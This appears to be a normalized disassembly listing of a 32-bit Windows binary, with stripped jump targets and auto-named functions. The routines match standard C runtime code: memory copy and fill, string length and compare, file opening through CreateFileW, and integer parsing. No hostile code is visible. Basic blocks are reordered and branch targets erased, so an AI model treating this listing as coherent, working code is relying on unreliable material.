test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1007f8f0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_100512c4
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1007f96a
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_10032529
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_10016a0d
add esp 0x20
pop esi
pop ebp
retn
sub_1007f99d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10032529
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_10016a0d
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1001ff32
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1000a5dd
pop ebx
leave
retn
sub_1007fa40
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1007fad0
push sub_1002d290
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1007fb29
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_10010c5e
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_1007fb58
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
dec [ ebp + 0xc ]
push eax
mov eax ebx
call sub_1007fb29
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x3f
mov eax ebx
call sub_1007fb29
pop ecx
sub_1007fbc0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1007fc48
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1005aa2b
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_10070419
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_1003a6bb
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
call sub_1004b131
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_1003a6bb
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
call sub_1004b131
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_10019342
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_1003a6bb
and [ eax ] 0x0
mov [ esi ] ebx
call sub_1005b670
mov [ eax ] 0x18
call sub_1005b670
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_1005bae3
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_1005bae3
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_1005b670
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_1005b670
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_1001e32d
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_10039f2f
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
and [ ebp - 0x28 ] 0x0
push 0x1
lea eax [ ebp - 0x28 ]
push eax
push [ esi ]
call sub_10037514
add esp 0xc
test eax eax
jne r-xdata
call sub_1003a6bb
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_10039f2f
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x28 ] 0x1a
jne r-xdata
push [ esi ]
call sub_100431a2
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_1005bae3
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_10040e4b
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_10011093
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_10037514
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_10049f3a
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_10049f3a
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_100431a2
pop ecx
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_10039f2f
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_10046777
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_10039f2f
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_10049f3a
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_10049f3a
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_1008037d
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_1000842a
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_100803b0
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_1008037d
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_1008037d
sub_10080420
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1008044b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
xor eax eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push 0x8
pop ebx
cmp [ ebp + 0x10 ] 0x2
jl r-xdata
pop edi
leave
retn
movzx esi [ edi ]
push ebx
push esi
add edi 0x2
call sub_1005c353
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp si 0x2d
jne r-xdata
cmp [ ebp + 0x10 ] 0x24
jg r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx esi [ edi ]
add edi 0x2
cmp [ ebp + 0x10 ] 0x10
jne r-xdata
push esi
call sub_10038974
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
mov ebx eax
push esi
call sub_10038974
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x10
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x14 ]
sub edi 0x2
test al 0x8
jne r-xdata
or [ ebp + 0x14 ] 0x8
cmp [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
imul ecx [ ebp + 0x10 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_1005b670
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
call sub_10038974
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp + 0x14 ] 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
test [ ebp + 0x14 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
pop esi
pop ebx
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x4 ]
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
sub_1008060d
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x30 ]
call sub_10051cf5
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
xor ecx ecx
cmp eax ecx
je r-xdata
cmp ebx ecx
jne r-xdata
mov [ eax ] ebx
cmp [ ebp + 0x14 ] ecx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push esi
movzx esi [ ebx ]
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
lea edi [ ebx + 0x2 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x8
push esi
call sub_1005c353
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop ebx
leave
retn
movzx esi [ edi ]
add edi 0x2
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
movzx esi [ edi ]
add edi 0x2
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
xor eax eax
xor edx edx
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x10
pop ebx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
call sub_10038974
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
push eax
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
call sub_10082370
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
push esi
call sub_10038974
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x14 ] ebx
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
sub edi 0x2
test al 0x8
jne r-xdata
mov ecx [ ebp - 0x4 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0xc ]
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_10082410
xor ecx ecx
add eax ebx
adc edx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
ja r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_1005b670
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_10038974
mov ebx eax
pop ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
lea ebx [ eax - 0x37 ]
sub eax 0x20
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0xc ]
jne r-xdata
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] ebx
jmp r-xdata
